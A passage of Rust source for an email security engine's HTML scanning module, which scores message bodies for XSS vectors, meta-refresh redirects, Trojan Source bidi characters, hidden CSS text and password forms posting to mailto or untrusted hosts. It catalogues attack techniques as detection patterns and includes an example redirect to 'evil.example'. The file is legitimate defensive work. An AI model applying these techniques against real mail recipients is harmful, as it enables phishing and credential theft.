//! HTML scan module - Detect malicious tags and dangerous attributes in HTML body

use std::sync::LazyLock;
use std::time::Instant;

use async_trait::async_trait;
use chrono::Utc;
use regex::Regex;
use serde::Deserialize;

use crate::context::SecurityContext;
use crate::error::EngineError;
use crate::matcher::css_hidden_content_patterns;
use crate::module::{Evidence, ModuleMetadata, ModuleResult, Pillar, SecurityModule, ThreatLevel};
use crate::module_data::module_data;
use crate::modules::content_scan::html_utils::count_css_hidden_class_markup;

/// Unicode bidirectional control characters used in RTL-override attacks
/// (filename spoofing, URL deception). U+202E is the classic "reverse text"
/// trick; U+2066-U+2069 are isolate controls introduced in Unicode 6.3 that
/// are frequently abused to hide malicious content from visual inspection.
/// See: CVE-2021-42574 "Trojan Source".
const BIDI_CONTROL_CHARS: &[char] = &[
    '\u{202A}', // LRE — left-to-right embedding
    '\u{202B}', // RLE — right-to-left embedding
    '\u{202C}', // PDF — pop directional formatting
    '\u{202D}', // LRO — left-to-right override
    '\u{202E}', // RLO — right-to-left override (most common abuse)
    '\u{2066}', // LRI — left-to-right isolate
    '\u{2067}', // RLI — right-to-left isolate
    '\u{2068}', // FSI — first-strong isolate
    '\u{2069}', // PDI — pop directional isolate
];

/// Zero-width / invisible characters often used to visually cloak malicious
/// keywords in rendered HTML. content_scan normalizes these for keyword
/// matching, but we also want to flag their *presence* at the HTML layer as
/// a strong signal of deliberate obfuscation.
const ZERO_WIDTH_CHARS: &[char] = &[
    '\u{200B}', // ZERO WIDTH SPACE
    '\u{200C}', // ZERO WIDTH NON-JOINER
    '\u{200D}', // ZERO WIDTH JOINER
    '\u{FEFF}', // ZERO WIDTH NO-BREAK SPACE (BOM)
    '\u{2060}', // WORD JOINER
    '\u{180E}', // MONGOLIAN VOWEL SEPARATOR
];

/// Match any `<meta ...>` tag. Refresh detection works tag-by-tag so it is
/// attribute-order independent: attackers flip `content` before `http-equiv`
/// (or drop the quotes) to dodge regexes that hardcode attribute order.
static META_TAG_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?is)<meta\b[^>]*>").expect("valid meta tag regex"));

/// `http-equiv=refresh` attribute: single/double-quoted or unquoted value,
/// arbitrary whitespace around `=`.
static META_HTTP_EQUIV_REFRESH_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)\shttp-equiv\s*=\s*(?:"refresh"|'refresh'|refresh\b)"#)
        .expect("valid http-equiv refresh regex")
});

/// `content` attribute value: double-quoted, single-quoted, or unquoted.
static META_CONTENT_ATTR_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)\scontent\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#)
        .expect("valid meta content regex")
});

/// Match `<a ... href="javascript:...">` / `<form action="javascript:...">` —
/// we want a dedicated signal beyond the generic "javascript:" substring.
static JS_HREF_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:href|action|src|formaction)\s*=\s*["']?\s*javascript:"#)
        .expect("valid js href regex")
});

static FORM_BLOCK_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?is)<form\b([^>]*)>(.*?)</form\s*>").expect("valid form block regex")
});

static FORM_ACTION_ATTR_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)\saction\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))"#)
        .expect("valid form action regex")
});

static INPUT_TAG_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?is)<input\b[^>]*>").expect("valid input tag regex"));

static INPUT_TYPE_ATTR_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)\stype\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))"#)
        .expect("valid input type regex")
});

static IFRAME_TAG_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?is)<iframe\b[^>]*>").expect("valid iframe tag regex"));

static IFRAME_SRC_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)\ssrc\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#)
        .expect("valid iframe src regex")
});

static IFRAME_CLASS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)\sclass\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#)
        .expect("valid iframe class regex")
});

static IFRAME_EVENT_ATTR_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?is)\bon[a-z]+\s*=").expect("valid iframe event attribute regex")
});

/// Match iframe event attributes together with their value.  An empty
/// `onerror`/`onload` attribute is inert HTML emitted by some mail clients;
/// only a non-empty handler is actionable XSS evidence.
static IFRAME_EVENT_VALUE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)\bon[a-z]+\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))"#)
        .expect("valid iframe event value regex")
});

pub struct HtmlScanModule {
    meta: ModuleMetadata,
}

impl Default for HtmlScanModule {
    fn default() -> Self {
        Self::new()
    }
}

impl HtmlScanModule {
    pub fn new() -> Self {
        Self {
            meta: ModuleMetadata {
                id: "html_scan".to_string(),
                name: "HTML Scan".to_string(),
                description:
                    "Scan HTML body for malicious tags, script injection, and dangerous attributes"
                        .to_string(),
                pillar: Pillar::Content,
                depends_on: vec![],
                timeout_ms: 3000,
                is_remote: false,
                supports_ai: false,
                cpu_bound: true,
                inline_priority: None,
            },
        }
    }
}

/// Dangerous HTML patterns with their severity weight and category label
struct HtmlPattern {
    pattern: &'static str,
    severity: f64,
    label: &'static str,
    category: &'static str,
}

/// Note: <script> tags are handled separately by analyze_scripts() for content analysis
const HTML_PATTERNS: &[HtmlPattern] = &[
    HtmlPattern {
        pattern: "<object",
        severity: 0.20,
        label: "Embedded object <object>",
        category: "xss",
    },
    HtmlPattern {
        pattern: "<embed",
        severity: 0.20,
        label: "Embedded content <embed>",
        category: "xss",
    },
    HtmlPattern {
        pattern: "javascript:",
        severity: 0.30,
        label: "javascript: protocol link",
        category: "xss",
    },
    HtmlPattern {
        pattern: "data:text/html",
        severity: 0.25,
        label: "data:text/html data URI",
        category: "xss",
    },
    HtmlPattern {
        pattern: "expression(",
        severity: 0.25,
        label: "CSS expression() function",
        category: "xss",
    },
    // NOTE: meta refresh is intentionally NOT a flat pattern here. A fixed
    // substring like `<meta http-equiv="refresh"` misses reordered/unquoted
    // attributes; refresh tags are detected attribute-order independently in
    // analyze() via META_TAG_RE + META_HTTP_EQUIV_REFRESH_RE.
];

fn html_attribute_value<'a>(regex: &Regex, tag: &'a str) -> Option<&'a str> {
    let mut captures = regex.captures_iter(tag);
    let first = captures.next()?;
    if captures.next().is_some() {
        return None;
    }
    (1..=3).find_map(|index| first.get(index).map(|value| value.as_str()))
}

fn attribute_uses_mailto_scheme(value: &str) -> bool {
    let decoded = crate::modules::content_scan::html_utils::decode_html_entities(value);
    let Some(colon) = decoded
        .char_indices()
        .take_while(|(index, _)| *index < 24)
        .find(|(_, ch)| *ch == ':')
        .map(|(index, _)| index)
    else {
        return false;
    };
    decoded[..colon]
        .chars()
        .filter(|ch| !ch.is_ascii_whitespace() && !ch.is_control())
        .collect::<String>()
        .eq_ignore_ascii_case("mailto")
}

fn attribute_uses_untrusted_http_target(value: &str) -> bool {
    let decoded = crate::modules::content_scan::html_utils::decode_html_entities(value);
    let Ok(parsed) = url::Url::parse(decoded.trim()) else {
        return false;
    };
    if !matches!(parsed.scheme(), "http" | "https") {
        return false;
    }
    let Some(host) = parsed.host_str() else {
        return false;
    };
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    let official_sso = module_data()
        .get_list("official_sso_domains")
        .iter()
        .any(|domain| host == *domain || host.ends_with(&format!(".{domain}")));
    !crate::modules::link_scan::is_trusted_url_domain(&host) && !official_sso
}

fn form_action_is_credential_target(value: &str) -> bool {
    attribute_uses_mailto_scheme(value) || attribute_uses_untrusted_http_target(value)
}

/// Detect a browser-submittable credential exfiltration form. `mailto:` and
/// trusted first-party/SSO actions are common in legitimate mail, so the form
/// becomes actionable only when it contains a password input and submits to
/// either mailto or an untrusted HTTP(S) host. Structure is scanned
/// on a view that does not expand `&lt;form&gt;`, preventing escaped examples
/// in security training mail from manufacturing a finding.
fn credential_form_findings(html: &str) -> Vec<Evidence> {
    FORM_BLOCK_RE
        .captures_iter(html)
        .take(32)
        .filter_map(|captures| {
            let attrs = captures.get(1)?.as_str();
            let body = captures.get(2)?.as_str();
            let action = html_attribute_value(&FORM_ACTION_ATTR_RE, attrs)?;
            if !form_action_is_credential_target(action) {
                return None;
            }
            let has_password_input = INPUT_TAG_RE.find_iter(body).any(|input| {
                html_attribute_value(&INPUT_TYPE_ATTR_RE, input.as_str())
                    .is_some_and(|kind| kind.trim().eq_ignore_ascii_case("password"))
            });
            if !has_password_input {
                return None;
            }
            Some(Evidence {
                description:
                    "HTML form submits a password field to mailto or an untrusted HTTP(S) target (credential exfiltration)"
                        .to_string(),
                location: Some("body_html:form".to_string()),
                snippet: captures
                    .get(0)
                    .map(|matched| matched.as_str().chars().take(240).collect()),
            })
        })
        .collect()
}

#[derive(Debug, Clone, Deserialize)]
struct MailtoCredentialFormPolicy {
    enabled: bool,
    result_category: String,
    score: f64,
}

fn mailto_credential_form_policy() -> Option<MailtoCredentialFormPolicy> {
    let policy = serde_json::from_value::<MailtoCredentialFormPolicy>(
        module_data()
            .get_structured("html_mailto_credential_form_policy_v1")?
            .clone(),
    )
    .ok()?;
    (policy.enabled
        && !policy.result_category.trim().is_empty()
        && (0.65..=1.0).contains(&policy.score))
    .then_some(policy)
}

pub(crate) fn is_credential_exfiltration_form_category(category: &str) -> bool {
    mailto_credential_form_policy().is_some_and(|policy| category == policy.result_category)
}

/// QQ Mail injects this exact first-party frame as an advertising/template
/// container. It is not sender-authored active content. Keep the exemption
/// narrow: exact HTTPS origin/path, expected template class, and no event or
/// srcdoc attributes. Every other iframe retains the original XSS score.
fn is_trusted_qq_mail_template_iframe(tag: &str) -> bool {
    let tag_lower = tag.to_lowercase();
    // A duplicate `src` attribute is ambiguous to HTML parsers and can hide a
    // different effective destination.  Do not let the first trusted-looking
    // value grant the template exemption.
    if IFRAME_SRC_RE.find_iter(&tag_lower).count() != 1 {
        return false;
    }
    let src = html_attribute_value(&IFRAME_SRC_RE, &tag_lower).unwrap_or_default();
    let classes = html_attribute_value(&IFRAME_CLASS_RE, &tag_lower).unwrap_or_default();

    src == "https://wxa.wxs.qq.com/tmpl/px/base_tmpl.html"
        && classes
            .split_ascii_whitespace()
            .any(|class| matches!(class, "iframe_ad_container" | "iframe_adv_ad_container"))
        && !tag_lower.contains("srcdoc")
        && !IFRAME_EVENT_ATTR_RE.is_match(&tag_lower)
}

fn inspect_iframes(html: &str) -> (usize, usize, Option<String>) {
    let mut trusted_count = 0usize;
    let mut suspicious_count = 0usize;
    let mut first_suspicious_snippet = None;

    for iframe_match in IFRAME_TAG_RE.find_iter(html) {
        let tag = iframe_match.as_str();
        let tag_lower = tag.to_lowercase();
        let src_attribute_count = IFRAME_SRC_RE.find_iter(&tag_lower).count();
        let empty_src = src_attribute_count == 0
            || (src_attribute_count == 1
                && html_attribute_value(&IFRAME_SRC_RE, &tag_lower)
                    .is_some_and(|src| src.trim().is_empty()));
        let has_nonempty_event_handler =
            IFRAME_EVENT_VALUE_RE.captures_iter(&tag_lower).any(|caps| {
                (1..=3)
                    .find_map(|idx| caps.get(idx).map(|m| m.as_str().trim()))
                    .is_some_and(|value| !value.is_empty())
            });

        // Empty iframes with no srcdoc and no executable event handler have
        // no remote or inline payload.  They are common sanitiser/MUA
        // artefacts and must not manufacture an XSS finding.
        if empty_src && !tag_lower.contains("srcdoc") && !has_nonempty_event_handler {
            continue;
        }
        if is_trusted_qq_mail_template_iframe(tag) {
            trusted_count += 1;
        } else {
            suspicious_count += 1;
            if first_suspicious_snippet.is_none() {
                first_suspicious_snippet = Some(tag.chars().take(160).collect());
            }
        }
    }

    (trusted_count, suspicious_count, first_suspicious_snippet)
}

/// Analyze <script> tags in HTML: extract content and check for dangerous operations
fn analyze_scripts(html_lower: &str, html_original: &str) -> (f64, Vec<Evidence>) {
    let mut score = 0.0f64;
    let mut evidence = Vec::new();
    let mut search_from = 0;
    let md = module_data();
    let dangerous_script_ops = md.get_list("dangerous_script_ops").to_vec();
    let active_script_risk_ops = md.get_list("active_script_risk_ops").to_vec();

    while let Some(open_idx) = html_lower[search_from..].find("<script") {
        let abs_open = search_from + open_idx;
        // find <script...> of >
        let tag_end = match html_lower[abs_open..].find('>') {
            Some(i) => abs_open + i + 1,
            None => break,
        };
        // find </script>
        let close_idx = match html_lower[tag_end..].find("</script") {
            Some(i) => tag_end + i,
            None => break,
        };
        let script_body = &html_lower[tag_end..close_idx];

        // Check whether content contains dangerous operations
        let dangerous_hits: Vec<&String> = dangerous_script_ops
            .iter()
            .filter(|op| script_body.contains(op.as_str()))
            .collect();
        let has_active_risk_op = active_script_risk_ops
            .iter()
            .any(|op| script_body.contains(op.as_str()));

        if !dangerous_hits.is_empty() && has_active_risk_op {
            // Generic functions, timers, and DOM text updates occur in
            // ordinary statement/newsletter templates. Require a configured
            // active source/sink/navigation/network/payload operation before
            // treating inline script as XSS evidence.
            score += 0.30;
            let ops: Vec<String> = dangerous_hits.iter().map(|s| s.to_string()).collect();
            let snip_start = abs_open.saturating_sub(10);
            let snip_end = (tag_end + 50).min(html_original.len());
            evidence.push(Evidence {
                description: format!(
                    "Inline script contains dangerous operations: {}",
                    ops.join(", ")
                ),
                location: Some("body_html".to_string()),
                snippet: Some(html_original[snip_start..snip_end].to_string()),
            });
        }
        // Scripts without dangerous operations are benign (e.g., var tracking = ...)

        search_from = close_idx + 9; // skip past </script>
    }

    (score, evidence)
}

/// Inspect event-handler attributes semantically.  Marketing and Office HTML
/// frequently contains empty `onerror`/`onload` attributes; their mere
/// presence is not executable content.  Only handlers carrying a known
/// script/network/navigation operation are promoted to XSS evidence.
fn check_suspicious_event_handlers(html_lower: &str, html_original: &str) -> Vec<Evidence> {
    static EVENT_HANDLER_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r#"(?is)\bon(?:error|load)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#)
            .expect("event handler regex")
    });
    let dangerous_handler_ops = module_data()
        .get_list("dangerous_inline_event_handler_ops")
        .to_vec();

    EVENT_HANDLER_RE
        .captures_iter(html_lower)
        .filter_map(|caps| {
            let value = (1..=3)
                .find_map(|idx| caps.get(idx).map(|m| m.as_str().trim()))
                .unwrap_or_default();
            if value.is_empty()
                || !dangerous_handler_ops
                    .iter()
                    .any(|op| value.contains(op.as_str()))
            {
                return None;
            }
            let start = caps.get(0)?.start();
            let end = caps.get(0)?.end().min(html_original.len());
            Some(Evidence {
                description: "Event handler contains executable or navigation code".to_string(),
                location: Some("body_html".to_string()),
                snippet: Some(html_original[start..end].to_string()),
            })
        })
        .collect()
}

fn check_suspicious_onclick_handlers(
    html_lower: &str,
    html_original: &str,
) -> Vec<(String, Option<String>)> {
    let mut findings = Vec::new();
    let mut search_from = 0usize;
    let dangerous_onclick_ops = module_data().get_list("dangerous_onclick_ops").to_vec();

    while let Some(rel_idx) = html_lower[search_from..].find("onclick=") {
        let abs_idx = search_from + rel_idx;
        let value_start = abs_idx + "onclick=".len();
        let Some(quote) = html_lower[value_start..].chars().next() else {
            break;
        };
        if quote != '"' && quote != '\'' {
            search_from = value_start;
            continue;
        }

        let content_start = value_start + quote.len_utf8();
        let rest = &html_lower[content_start..];
        let Some(end_rel) = rest.find(quote) else {
            break;
        };
        let handler = &rest[..end_rel];

        if dangerous_onclick_ops
            .iter()
            .any(|op| handler.contains(op.as_str()))
        {
            let snip_start = abs_idx.saturating_sub(20);
            let snip_end = (content_start + end_rel + 40).min(html_original.len());
            findings.push((
                handler.to_string(),
                Some(html_original[snip_start..snip_end].to_string()),
            ));
        }

        search_from = content_start + end_rel + quote.len_utf8();
    }

    findings
}

/// Check for base64-encoded data URIs (often used to embed malicious payloads)
fn check_base64_data_uris(html_lower: &str) -> Vec<(String, usize)> {
    let mut findings = Vec::new();
    let search = "data:";
    let mut pos = 0;
    while let Some(idx) = html_lower[pos..].find(search) {
        let abs_pos = pos + idx;
        let after = &html_lower[abs_pos + search.len()..];
        // Look for ;base64, within the next 60 chars
        if let Some(b64_pos) = after.get(..60).and_then(|s| s.find(";base64,")) {
            let mime_type = &after[..b64_pos];
            // Skip known-safe image types for favicon etc.
            if !mime_type.starts_with("image/png")
                && !mime_type.starts_with("image/jpeg")
                && !mime_type.starts_with("image/gif")
                && !mime_type.starts_with("image/svg")
            {
                findings.push((format!("data:{}(base64)", mime_type), abs_pos));
            }
        }
        pos = abs_pos + search.len();
    }
    findings
}

/// Numeric HTML character references: `&#8238;` (decimal) or `&#x202E;` (hex).
/// The terminating semicolon is optional, matching browser parse-error
/// recovery (`&#8238` without ';' still renders as U+202E).
static NUMERIC_ENTITY_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"&#(?:x([0-9a-fA-F]+)|(\d+));?").expect("valid numeric entity regex")
});

/// Decode numeric HTML character references to their Unicode scalar values.
/// An HTML body that spells BIDI/zero-width characters as entities renders
/// identically in the MUA, but the raw text carries no literal control
/// character — entity decoding must happen before counting them. Malformed
/// or out-of-range references are left untouched.
fn decode_numeric_entities(html: &str) -> String {
    NUMERIC_ENTITY_RE
        .replace_all(html, |caps: &regex::Captures<'_>| {
            let code = if let Some(hex) = caps.get(1) {
                u32::from_str_radix(hex.as_str(), 16).ok()
            } else {
                caps.get(2).and_then(|dec| dec.as_str().parse::<u32>().ok())
            };
            code.and_then(char::from_u32)
                .map(|c| c.to_string())
                .unwrap_or_else(|| caps[0].to_string())
        })
        .into_owned()
}

fn utf8_safe_slice(input: &str, start: usize, end: usize) -> String {
    let mut safe_start = start.min(input.len());
    while safe_start > 0 && !input.is_char_boundary(safe_start) {
        safe_start -= 1;
    }
    let mut safe_end = end.min(input.len());
    while safe_end < input.len() && !input.is_char_boundary(safe_end) {
        safe_end += 1;
    }
    input[safe_start..safe_end].to_string()
}

/// Count Unicode bidirectional control characters (RLO/LRO/RLI/LRI/...) in
/// the HTML body. Returns `(total_count, distinct_char_count)`. Any presence
/// of these outside of legitimate multilingual content is a strong signal of
/// "Trojan Source" style spoofing or filename/URL deception in the rendered
/// email, since raw HTML bodies from legitimate MUAs rarely contain them.
fn count_bidi_control_chars(html: &str) -> (usize, usize) {
    let mut total = 0usize;
    let mut distinct = [false; 9];
    for ch in html.chars() {
        if let Some(idx) = BIDI_CONTROL_CHARS.iter().position(|&c| c == ch) {
            total += 1;
            distinct[idx] = true;
        }
    }
    (total, distinct.iter().filter(|&&b| b).count())
}

/// Count zero-width / invisible characters within visible text regions of
/// the HTML (approximates: anywhere outside of `<style>`/`<script>` blocks
/// where they might be legitimate encoding artefacts). Returns the total.
fn count_zero_width_chars(html: &str) -> usize {
    html.chars()
        .filter(|c| ZERO_WIDTH_CHARS.contains(c))
        .count()
}

/// Remove `<style>` blocks while preserving the rest of the HTML.  CSS rules
/// commonly contain responsive `display:none` declarations (for example, an
/// alternate mobile image in Apple/Office mail templates); those declarations
/// are not hidden user-visible payloads and should not be scored as such.
fn without_style_blocks(html_lower: &str) -> String {
    let mut result = String::with_capacity(html_lower.len());
    let mut cursor = 0usize;

    while let Some(rel_start) = html_lower[cursor..].find("<style") {
        let start = cursor + rel_start;
        result.push_str(&html_lower[cursor..start]);
        let Some(rel_end) = html_lower[start..].find("</style>") else {
            // Malformed/incomplete HTML: discard the remainder as style text.
            break;
        };
        cursor = start + rel_end + "</style>".len();
    }
    result.push_str(&html_lower[cursor..]);
    result
}

/// Inline hidden images/spacers are normal in responsive email templates. A
/// hidden block element, on the other hand, may contain a payload intended to
/// evade visual inspection and remains a meaningful signal.
fn count_suspicious_hidden_inline_markup(html_lower_without_style: &str) -> usize {
    static HIDDEN_INLINE_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r#"(?is)<([a-z][a-z0-9]*)\b[^>]*\bstyle\s*=\s*[\"']([^\"']*)[\"'][^>]*>"#)
            .expect("valid hidden inline markup regex")
    });
    static HIDDEN_DECLARATION_RE: LazyLock<Regex> = LazyLock::new(|| {
        // Match a complete CSS declaration value: the prefix `font-size:1`
        // in ordinary 12px/14px/18px text does not make that text hidden.
        Regex::new(
            r"(?is)(?:^|;)\s*(?:display\s*:\s*none|visibility\s*:\s*hidden|font-size\s*:\s*(?:0(?:px|pt)?|1(?:px|pt)?))\s*(?:!important\s*)?(?:;|$)",
        )
        .expect("valid complete hidden CSS declaration regex")
    });

    HIDDEN_INLINE_RE
        .captures_iter(html_lower_without_style)
        .filter(|caps| {
            if !caps
                .get(2)
                .is_some_and(|style| HIDDEN_DECLARATION_RE.is_match(style.as_str()))
            {
                return false;
            }
            let tag = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
            if matches!(tag, "img" | "br" | "hr" | "td" | "th" | "tr" | "table") {
                return false;
            }

            // QQ Mail's large-attachment template places the opaque download URL
            // in a hidden span as a plain-text fallback next to the visible
            // "进入下载页面" link.  It is not a hidden payload: the URL is a
            // known first-party tokenized resource already handled by link_scan.
            if tag.eq_ignore_ascii_case("span")
                && let Some(open_tag) = caps.get(0)
                && let Some(close_rel) = html_lower_without_style[open_tag.end()..].find("</span>")
            {
                let inner = &html_lower_without_style[open_tag.end()..open_tag.end() + close_rel];
                let candidate = inner.trim().trim_start_matches([':', '：']).trim();
                if crate::modules::link_scan::is_known_safe_tokenized_resource_url(candidate) {
                    return false;
                }
            }

            true
        })
        .count()
}

/// Detect action-bearing text deliberately rendered at unreadable size and
/// contrast. A tiny font alone is common in footers; promote only when the
/// same hidden block contains an untrusted URL, a security/account context,
/// an action, and a consequential expiry or suspension statement.
fn tiny_font_actionable_payloads(ctx: &SecurityContext, html_lower: &str) -> Vec<String> {
    static INLINE_STYLE_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r#"(?is)<([a-z][a-z0-9]*)\b[^>]*\bstyle\s*=\s*[\"']([^\"']*)[\"'][^>]*>"#)
            .expect("valid inline style tag regex")
    });
    static TINY_FONT_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"(?i)(?:^|;)\s*font-size\s*:\s*(?:0(?:px|pt)?|1(?:px|pt)?)\s*(?:;|$)")
            .expect("valid tiny font style regex")
    });
    static LOW_CONTRAST_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(
            r"(?i)color\s*:\s*(?:#f[0-9a-f]f[0-9a-f]f[0-9a-f]|#fff(?:fff)?|white|transparent)",
        )
        .expect("valid low contrast style regex")
    });
    static URL_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r#"(?i)https?://[^\s\"'<>]+"#).expect("valid hidden URL regex")
    });

    INLINE_STYLE_RE
        .captures_iter(html_lower)
        .filter_map(|captures| {
            let tag = captures.get(1)?.as_str();
            let style = captures.get(2)?.as_str();
            if !matches!(tag, "p" | "span" | "div" | "li")
                || !TINY_FONT_RE.is_match(style)
                || !LOW_CONTRAST_RE.is_match(style)
            {
                return None;
            }

            let open_tag = captures.get(0)?;
            let closing = format!("</{tag}");
            let close_rel = html_lower[open_tag.end()..].find(&closing)?;
            let inner = &html_lower[open_tag.end()..open_tag.end() + close_rel];
            let has_external_untrusted_url = URL_RE.find_iter(inner).any(|matched| {
                let raw = matched.as_str().trim_end_matches([
                    '.', ',', ';', ':', '!', '?', '，', '。', '；', '：', ')', '）',
                ]);
                let Ok(parsed) = url::Url::parse(raw) else {
                    return false;
                };
                let Some(host) = parsed.host_str().map(str::to_ascii_lowercase) else {
                    return false;
                };
                matches!(parsed.scheme(), "http" | "https")
                    && !ctx.is_internal_domain(&host)
                    && !module_data().contains("protected_domains", &host)
                    && !crate::modules::link_scan::is_trusted_url_domain(&host)
                    && !crate::modules::link_scan::is_well_known_safe_domain(&host)
            });
            let has_security_context = [
                "account",
                "vpn",
                "password",
                "credential",
                "证书",
                "账户",
                "账号",
                "凭据",
                "权限",
            ]
            .iter()
            .any(|term| inner.contains(term));
            let has_recipient_action = [
                "verify", "update", "renew", "check", "login", "立即", "更新", "核验", "验证",
            ]
            .iter()
            .any(|term| inner.contains(term));
            let has_consequence = [
                "otherwise",
                "unless",
                "or your",
                "否则",
                "将无法",
                "暂停",
                "suspend",
                "expire",
                "过期",
                "停用",
            ]
            .iter()
            .any(|term| inner.contains(term));
            (has_external_untrusted_url
                && has_security_context
                && has_recipient_action
                && has_consequence)
                .then(|| inner.chars().take(180).collect())
        })
        .collect()
}

fn has_responsive_media_css(html_lower: &str) -> bool {
    html_lower.contains("@media")
        && (html_lower.contains("max-width")
            || html_lower.contains("min-width")
            || html_lower.contains("-webkit-min-device-pixel-ratio"))
}

/// Extract the URL target from any `<meta http-equiv="refresh">` tags.
/// The `content` attribute has format `<seconds>;URL=<target>` (case-insensitive,
/// flexible whitespace). Returns all extracted target URLs.
fn extract_meta_refresh_urls(html: &str) -> Vec<String> {
    let mut urls = Vec::new();
    for tag_match in META_TAG_RE.find_iter(html) {
        let tag = tag_match.as_str();
        if !META_HTTP_EQUIV_REFRESH_RE.is_match(tag) {
            continue;
        }
        let Some(content) = html_attribute_value(&META_CONTENT_ATTR_RE, tag) else {
            continue;
        };
        // `content` is like `"0; URL=https://evil.example/landing"`,
        // `"0;url=..."`, or — sloppy real-world payloads — `" 5 ; url = ... "`.
        // We need to tolerate arbitrary whitespace around the `url` token and
        // around the `=` separator. Lower-case the haystack for case-insensitive
        // search and walk through the bytes manually.
        let lower = content.to_lowercase();
        let bytes = lower.as_bytes();
        let mut i = 0usize;
        while i + 3 <= bytes.len() {
            if &bytes[i..i + 3] == b"url" {
                // Make sure this is the start of a token (not e.g. "curl=").
                let prev_is_boundary = i == 0 || matches!(bytes[i - 1], b' ' | b'\t' | b';' | b',');
                if !prev_is_boundary {
                    i += 1;
                    continue;
                }
                let mut j = i + 3;
                while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                    j += 1;
                }
                if j < bytes.len() && bytes[j] == b'=' {
                    j += 1;
                    while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                        j += 1;
                    }
                    let url = content[j..]
                        .trim()
                        .trim_matches(|c| c == '"' || c == '\'')
                        .to_string();
                    if !url.is_empty() {
                        urls.push(url);
                    }
                    break;
                }
            }
            i += 1;
        }
    }
    urls
}

/// Heuristic: is a URL a likely phishing redirect target?
/// We delegate URL structure scoring to `link_content::analyze_url` when
/// available but also apply simple additional signals specific to meta
/// refresh: non-self-hosted schemes, suspiciously short domains, auth
/// parameters on the query string, etc.
fn score_meta_refresh_url(url: &str) -> (f64, Vec<String>) {
    let url_lower = url.to_lowercase();
    let mut score = 0.0f64;
    let mut reasons = Vec::new();

    // Non-http protocols (javascript:, data:, file:) are always suspicious.
    if url_lower.starts_with("javascript:")
        || url_lower.starts_with("data:")
        || url_lower.starts_with("file:")
        || url_lower.starts_with("vbscript:")
    {
        score += 0.45;
        reasons.push("meta_refresh_dangerous_scheme".to_string());
    }

    // Delegate structural URL analysis to link_content if it's an http(s) URL.
    if url_lower.starts_with("http://") || url_lower.starts_with("https://") {
        let (url_score, url_cats) = crate::modules::link_content::analyze_url(url);
        if url_score > 0.0 {
            // Cap meta-refresh delegation score so a single suspicious URL
            // doesn't by itself tip the module into critical territory.
            score += url_score.min(0.30);
            for (cat, _) in url_cats {
                reasons.push(format!("meta_refresh_{}", cat));
            }
        }

        // Credential-harvesting query parameters on a redirect target are a
        // strong signal regardless of hostname reputation.
        if url_lower.contains("token=")
            || url_lower.contains("auth=")
            || url_lower.contains("session=")
            || url_lower.contains("redirect=")
            || url_lower.contains("continue=")
        {
            score += 0.10;
            reasons.push("meta_refresh_auth_param".to_string());
        }
    }

    (score, reasons)
}

#[async_trait]
impl SecurityModule for HtmlScanModule {
    fn metadata(&self) -> &ModuleMetadata {
        &self.meta
    }

    async fn analyze(&self, ctx: &SecurityContext) -> Result<ModuleResult, EngineError> {
        let start = Instant::now();

        let body_html = match ctx.session.content.body_html {
            Some(ref html) => html,
            None => {
                let duration_ms = start.elapsed().as_millis() as u64;
                return Ok(ModuleResult::not_applicable(
                    &self.meta.id,
                    &self.meta.name,
                    self.meta.pillar,
                    "No HTML body in email",
                    duration_ms,
                ));
            }
        };

        let html_lower = body_html.to_lowercase();
        // Entity-decoded views for pattern scanning. Attackers spell
        // dangerous tokens as character references (jav&#97;script:,
        // d&#97;ta:, <m&#101;ta http-equiv=...>, &#109;eta refresh), which
        // render identically in the MUA but never appear literally in the
        // raw HTML.
        // - `entity_decoded` (shared full decoder) feeds the flat substring
        //   patterns, where browser-visible text semantics are what matter.
        // - `numeric_decoded` (numeric references only, no &lt;/&gt;
        //   expansion) feeds the tag-structure matchers, so escaped example
        //   code such as `&lt;meta ...&gt;` cannot manufacture tags the
        //   browser would render as plain text. BIDI / zero-width counting
        //   uses it too.
        // The raw body_html is preserved for every other check and snippet.
        let entity_decoded =
            crate::modules::content_scan::html_utils::decode_html_entities(body_html);
        let entity_decoded_lower = entity_decoded.to_lowercase();
        let numeric_decoded = decode_numeric_entities(body_html);
        let mut evidence = Vec::new();
        let mut categories = Vec::new();
        let mut total_score: f64 = 0.0;

        // Check each dangerous pattern (excluding <script> which is handled separately).
        // Patterns are counted on the entity-decoded view so character-reference
        // variants (jav&#97;script:, d&#97;ta:text/html) cannot slip through;
        // decoding never removes a literal raw occurrence, so raw hits are a
        // subset of decoded hits.
        for pat in HTML_PATTERNS {
            let pat_lower = pat.pattern.to_lowercase();
